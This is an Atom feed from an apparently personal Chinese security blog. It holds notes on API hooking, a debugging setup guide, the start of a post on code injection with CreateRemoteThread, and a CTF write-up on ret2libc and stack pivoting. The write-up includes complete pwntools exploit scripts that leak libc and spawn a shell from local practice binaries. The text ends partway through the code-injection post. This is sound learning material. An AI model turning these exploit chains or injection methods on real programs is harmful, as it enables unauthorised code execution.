<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pRism</title>
  
  
  <link href="https://www.pri87.vip/atom.xml" rel="self"/>
  
  <link href="https://www.pri87.vip/"/>
  <updated>2025-01-10T15:47:05.040Z</updated>
  <id>https://www.pri87.vip/</id>
  
  <author>
    <name>pRism</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《逆核》0A-API勾取</title>
    <link href="https://www.pri87.vip/posts/6dc52a20.html"/>
    <id>https://www.pri87.vip/posts/6dc52a20.html</id>
    <published>2025-01-10T15:32:25.000Z</published>
    <updated>2025-01-10T15:47:05.040Z</updated>
    
    <content type="html"><![CDATA[<h2 id="API勾取"><a href="#API勾取" class="headerlink" title="API勾取"></a>API勾取</h2><p>实际上就是对程序使用的系统API进行Hook</p><p><img src="https://s2.loli.net/2025/01/10/YvLw8UG9QMeoKry.png" alt="image-20250110233657957"></p><p>可以修改IAT&#x2F;EAT&#x2F;代码，对于直接hook代码，和之前的inlineHook一样<br>对于IAT，是程序执行对应API代码时，IAT会存放对应函数偏移，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp cs:offset</span><br><span class="line">......</span><br><span class="line">offset 真实偏移</span><br></pre></td></tr></table></figure><p>可以直接修改这里的真实偏移，然后跳转到自己的代码中，最后跳转到真实偏移地址。</p><p>本质上还是Hook，但是要注意参数的传递，具体可以看之前的调用约定那一篇或者具体调试分析。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>详见下面这个项目：</p><p><a href="https://github.com/43287/AntiAntiDebug_plugin_for_IDA8.3">43287&#x2F;AntiAntiDebug_plugin_for_IDA8.3: 一个只支持x64的IDA反调试插件</a></p><p>其中使用了IAThook和InlineHook</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;API勾取&quot;&gt;&lt;a href=&quot;#API勾取&quot; class=&quot;headerlink&quot; title=&quot;API勾取&quot;&gt;&lt;/a&gt;API勾取&lt;/h2&gt;&lt;p&gt;实际上就是对程序使用的系统API进行Hook&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.ne</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ret2libc与栈迁移</title>
    <link href="https://www.pri87.vip/posts/26c65c86.html"/>
    <id>https://www.pri87.vip/posts/26c65c86.html</id>
    <published>2025-01-04T08:59:23.000Z</published>
    <updated>2025-01-04T09:06:09.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RET2libc"><a href="#RET2libc" class="headerlink" title="RET2libc"></a>RET2libc</h3><p>一般情况下，一个程序不会有system(“bin&#x2F;sh”)这种危险代码让我们直接getshell。</p><p>ret2libc是一种方法，让我们取得外部动态链接库(so)的基地址，并通过基地址加偏移的方式获得目标库函数的地址，从而在程序没有主动调用目标函数时修改ret地址返回到我们想要的库函数地址。</p><p>练习题：</p><p>打开先checksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><p>有部分RELRO和NX保护</p><p>vuln函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行了一次输出，一次输入，输入长度为112，很明显可以覆盖地址</p><p>程序没有bin&#x2F;sh字符串和system地址，所以只能自己泄漏出来</p><p>got表会先按执行顺序生成地址，所以先进入main后一定会先生成__libc_start_main函数。通过这个得到libc基地址然后加对应偏移得到system和bin&#x2F;sh地址，最后构造rop链去执行函数</p><p>顺序：</p><p>vuln–&gt;puts–&gt;system</p><p>现在还有一个问题，我们控制的地址只是栈，但是puts函数的传参却在寄存器里面，该如何把栈中的值放到寄存器里呢，很明显，pop指令</p><p>可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8     ; __unwind &#123;</span><br><span class="line">.text:00000000004011E8 000                 endbr64</span><br><span class="line">.text:00000000004011EC 000                 push    rbp</span><br><span class="line">.text:00000000004011ED 008                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011F0 008                 sub     rsp, 70h</span><br><span class="line">.text:00000000004011F4 078                 lea     rax, s          ; &quot;RET2LIBC &gt;_&lt;&quot;</span><br><span class="line">.text:00000000004011FB 078                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004011FE 078                 call    _puts</span><br><span class="line">.text:0000000000401203 078                 lea     rax, [rbp+var_70]</span><br><span class="line">.text:0000000000401207 078                 mov     rdi, rax</span><br><span class="line">.text:000000000040120A 078                 mov     eax, 0</span><br><span class="line">.text:000000000040120F 078                 call    _gets</span><br><span class="line">.text:0000000000401214 078                 nop</span><br><span class="line">.text:0000000000401215 078                 leave</span><br><span class="line">.text:0000000000401216 000                 retn</span><br><span class="line">.text:0000000000401216     ; &#125; // starts at 4011E8</span><br><span class="line">.text:0000000000401216     vuln            endp</span><br></pre></td></tr></table></figure><p>这里传给puts的值是rdi</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>用gadget看看，发现0x00000000004011e3 : pop rdi ; ret<br>如果先返回这个地址，就可以把写入栈的泄露地址给rdi，然后执行后面的操作</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x00000000004011e3</span>)+p64(libc_start_main_got)+p64(<span class="number">0x401060</span>)+p64(<span class="number">0x401090</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span> +p64(<span class="number">0x000000000040101a</span>)+p64(<span class="number">0x00000000004011e3</span>)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>打开task题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know Stack_Pivoting?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401221</span>     main            proc near               ; DATA XREF: _start+<span class="number">18</span>↑o</span><br><span class="line">.text:<span class="number">0000000000401221</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401221</span> <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401225</span> <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401226</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401229</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040122</span>E <span class="number">008</span>                 call    init</span><br><span class="line">.text:<span class="number">0000000000401233</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401238</span> <span class="number">008</span>                 call    vuln</span><br><span class="line">.text:<span class="number">000000000040123</span>D <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401242</span> <span class="number">008</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401243</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401243</span>     ; &#125; <span class="comment">// starts at 401221</span></span><br><span class="line">.text:<span class="number">0000000000401243</span>     main            endp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004011</span>DB     ; <span class="type">void</span> <span class="title function_">gadget</span><span class="params">()</span></span><br><span class="line">.text:00000000004011DB                     public gadget</span><br><span class="line">.text:00000000004011DB     gadget          proc near</span><br><span class="line">.text:00000000004011DB     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004011</span>DB <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000004011</span>DF <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004011E0</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004011E3</span> <span class="number">008</span>                 pop     rdi</span><br><span class="line">.text:<span class="number">00000000004011E4</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004011E4</span>     gadget          endp</span><br><span class="line">.text:<span class="number">00000000004011E4</span></span><br><span class="line">.text:<span class="number">00000000004011E4</span>     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004011E5</span>                     align <span class="number">2</span></span><br><span class="line">.text:<span class="number">00000000004011E6</span>                     pop     rbp</span><br><span class="line">.text:<span class="number">00000000004011E7</span>                     retn</span><br><span class="line">.text:<span class="number">00000000004011E7</span>     ; &#125; <span class="comment">// starts at 4011DB</span></span><br></pre></td></tr></table></figure><p>依然没有bin&#x2F;sh和system，所以依然需要ret2libc</p><p>但是观察read函数可以发现，可以写入0x50，数组长度0x40，所以只能写入2个地址去覆盖，这里很明显是不够的，<br>然后看看有没有可能修改0x50这个数，发现没有</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack_pivoting --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br></pre></td></tr></table></figure><p>如果按上一个题(ret2libc)两次分别需要写入：</p><p>pop_rdi+libc地址+puts地址+start地址<br>pop_rdi+bin&#x2F;sh地址+system地址</p><p>对于16字节，还是不够的，所以不妨换个思路，如果写入的内容区域不能改变，那要是可以改变rsp指针也可以，如果算上所有的空间，有0x50个，这样就够了，只要想办法把rsp放到这个空间开头就好了</p><p>能修改rsp的指令是leave<br>效果是：mov rsp，rbp；pop rbp</p><p>但是这个指令只能使得rsp指向rbp指向的地址，因此，在栈迁移中，rbp就类似一个引子，通过修改rbp的值间接修改rsp的值。每次leave之后，都会pop rbp，一定注意这里pop出的地址就是rsp下次的地址。对于这个题，每次可写的区域是rbp之上的内容(rbp-0x40)和rbp下次的地址和ret地址</p><p><img src="https://s2.loli.net/2025/01/04/TE8YqDnzmgLeG1O.png" alt="image-20250103235741084"></p><p>如果这样写入，会直接跳过rop链(因为read之后直接leave了)然后rsp就到下面了，这样无法实现执行的效果，但是每次read之后必然是ret，所以这时需要一个方法把rsp放到上面去</p><p><img src="https://s2.loli.net/2025/01/04/6lG5YXwLsKqk9RT.png" alt="image-20250103235925955"></p><p>刚刚说了，rbp是rsp的因子，想要修改rsp必须先修改rbp，然后再leave，因此可以通过先把rbp放到链首然后再leave的方式修改rsp的值</p><p><img src="https://s2.loli.net/2025/01/04/GPSFt8zlbeoc6XV.png" alt="image-20250104002905805"></p><p>执行leave_ret之后</p><p><img src="https://s2.loli.net/2025/01/04/iIyVZDQMsn3vkHp.png" alt="image-20250104003447718"></p><p>leave_ret还有一个ret，可以直接触发rop链</p><p>那么，流程是这样的：</p><p>栈迁移+触发第一次的rop链+栈迁移+触发第二次rop</p><p>注意：在system函数中rsp值会减0x338，要留够空间，实际给了0x800。read函数读取值时参数在栈上，不能被覆盖，所以第一次给值后需要把下次的rbp放到更后面的位置(值更大)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">name = <span class="string">&quot;./stack_pivoting&quot;</span></span><br><span class="line"></span><br><span class="line">new_rbp = <span class="number">0x4040A0</span>+<span class="number">0x800</span> <span class="comment">#分配足够大的空间</span></span><br><span class="line">e = ELF(name)</span><br><span class="line">pPop_rdi = p64(<span class="number">0x4011E3</span>)</span><br><span class="line">pStart = p64(e.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line">pRet = p64(<span class="number">0x4011E4</span>)</span><br><span class="line">pLeave_ret = p64(<span class="number">0x40121F</span>)</span><br><span class="line">pDataBef = p64(new_rbp-<span class="number">0x40</span>)</span><br><span class="line">pData = p64(new_rbp)</span><br><span class="line">pDataNext = p64(new_rbp+<span class="number">0x40</span>)</span><br><span class="line">pReadbuf = p64(<span class="number">0x401203</span>)</span><br><span class="line">pPuts = p64(<span class="number">0x401064</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(name)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you know Stack_Pivoting?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#当rbp修改后,使用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop1</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#最前面留rbp返回到开始的那个地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pDataBef + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop2</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#最前面留rbp返回到开始的那个地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pData + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x40</span>)+pData+pReadbuf</span><br><span class="line">p.send(payload1) <span class="comment">#修改rbp</span></span><br><span class="line"></span><br><span class="line">payload2 = pPop_rdi+p64(libc_start_main_got)+pPuts+pRet+pReadbuf+cyclic(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sendRop1(p,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = pPop_rdi + p64(binsh_addr) +pRet+p64(system_addr)+cyclic(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendRop2(p,payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学PWN，QAQ</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/"/>
    
    <category term="栈溢出" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="ret2libc" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/"/>
    
    <category term="栈迁移" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    
    <category term="pwn" scheme="https://www.pri87.vip/tags/pwn/"/>
    
    <category term="栈" scheme="https://www.pri87.vip/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>IDA-vscode-wsl联合调试pwn题的exp脚本</title>
    <link href="https://www.pri87.vip/posts/ac1dbd3e.html"/>
    <id>https://www.pri87.vip/posts/ac1dbd3e.html</id>
    <published>2025-01-03T13:12:10.000Z</published>
    <updated>2025-01-03T13:29:24.506Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>作为只会用IDA调试的尊(fei)贵(wu)RE手，调pwn的exp用gdb实在用不来QAQ，所以想了个办法</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>wsl2-Ubuntu</li><li>IDA8.3</li><li>vscode及python插件</li><li>pwn题和对应的exp</li></ul><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>wsl中在题目目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code .</span><br></pre></td></tr></table></figure><p>如果主机有vscode应该会被唤醒，然后执行wsl的vscode server的安装，安装完后，可以在wsl中使用vscode<br>然后在插件中安装调试python的插件</p><p>将idaserver放入wsl中，启动</p><p>用wsl中的vscode启动调试，断点断在<code>p = process(xxx)</code>之后</p><p>ida附加，在进程列表中找到对应的进程</p><p>然后愉快地开始调试，注意两边要一起调</p>]]></content>
    
    
    <summary type="html">这篇该放RE还是pwn呢QAQ</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="实践" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="记录" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/"/>
    
    <category term="环境配置" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/pwn/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="调试" scheme="https://www.pri87.vip/tags/%E8%B0%83%E8%AF%95/"/>
    
    <category term="ida" scheme="https://www.pri87.vip/tags/ida/"/>
    
    <category term="pwn" scheme="https://www.pri87.vip/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>《逆核》09-代码注入</title>
    <link href="https://www.pri87.vip/posts/37cfb00c.html"/>
    <id>https://www.pri87.vip/posts/37cfb00c.html</id>
    <published>2024-12-31T11:53:09.000Z</published>
    <updated>2025-01-01T13:19:52.119Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>之前学习了DLL注入，实际上让进程执行我们自己的代码还有另一种方式，就是代码注入。<br>顾名思义，将代码注入进程，然后创建远程线程去执行。</p><p>和DLL注入的区别很明显：DLL注入是通过LoadLibrary自动执行DLL内的初始化函数从而实现执行我们的函数，而代码注入则是直接申请空间并写入函数机器码及对应传参，最后用CreateRemoteThread将函数首地址和传参首地址做参数来执行。</p><p>具体流程：</p><ul><li>获取目标进程句柄</li><li>将参数打包为结构体</li><li>将结构体写入目标进程</li><li>将需要执行的函数写入目标进程</li><li>创建远程线程执行</li></ul><blockquote><p>按书上的直接写结果会崩溃，调试了一下发现因为有跳转表之类的东西，所以地址不对应<br>在项目-属性-链接器-增量链接-禁用后<br>项目-属性-C&#x2F;C++-代码生成-安全检查-禁用<br>项目-属性-C&#x2F;C++-优化-内联函数扩展-禁用<br>项目-属性-C&#x2F;C++-常规-支持仅我的代码调试-禁用</p></blockquote><p>以上几个禁用后，可以在debug配置下缩小代码规模和防止出现奇怪地址的跳转</p><p>同时似乎函数位置不一定和写代码的时候的位置一样，所以要看一下</p><p>然后是导入表的问题，如果是直接使用库函数，会直接跳转到导入表条目，所以不能在代码中直接使用库函数，必须取得后传地址过去。</p><h2 id="实践C"><a href="#实践C" class="headerlink" title="实践C"></a>实践C</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 